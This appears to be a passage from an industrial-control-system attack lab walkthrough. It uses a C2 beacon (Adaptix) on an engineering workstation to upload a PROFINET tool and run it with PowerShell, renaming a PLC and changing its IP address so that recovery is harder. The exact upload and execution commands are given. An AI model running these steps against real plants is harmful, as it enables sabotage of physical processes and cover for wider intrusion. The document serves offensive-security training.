Now it's time to hack the PLC. We will also change the IP address of the PLC to make sure it'll be more difficult to recover from this attack.
	
By dropping the malware, we also made sure that we will have access to the IT environment very soon. Let's use the hack of the PLC as confusion to get access to the entire environment.
	
Go back to the beacon on the Windows 7 (engineering station) which is running under the local admin context. We need to upload our scan first.

<div class="info">

If it's not active anymore, login to the Windows 7 PC with the local admin credentials and execute the w7hacked.exe as administrator. You can find this file in the downloads folder. You don't need to elevate any priviliges.

</div>

Now upload the file with the upload command in Adaptix, changing the <your-username> to ot_engX:

```
upload /home/sysadmin/AdaptixProjects/ShadowHackers/profinet_tool_nn_lab_auto_v2.7.1.py C:\Users\<your-username>\Desktop\profinet_tool_nn_lab_auto_v2.7.1.py
```

Now the script is on the device. We have already put python on the machine, but you could've perfectly used Adaptix to install this on the machine.

On the beacon, we will now execute a python script to scan for their PLC. Since we can't do python scripts directly with Adaptix, we will leverage powershell to do this for us.

```	
powershell py "C:\Users\<your-username>\Desktop\profinet_tool_nn_lab_auto_v2.7.1.py" lab-auto --name hackedplc001 --t FC 00 --led pulse -w --log-file "C:\Users\<your username>\Desktop\automation_lab.jsonl" --yes-i-own-this-network

```
	
When you execute the script, you will get the output and you will see that the IP address has changed. The ip address wil change with 1 higher than the original (in the screenshot a bit more since we tried it multiple times)

![Script execute](/images/Script_Executed.jpg)
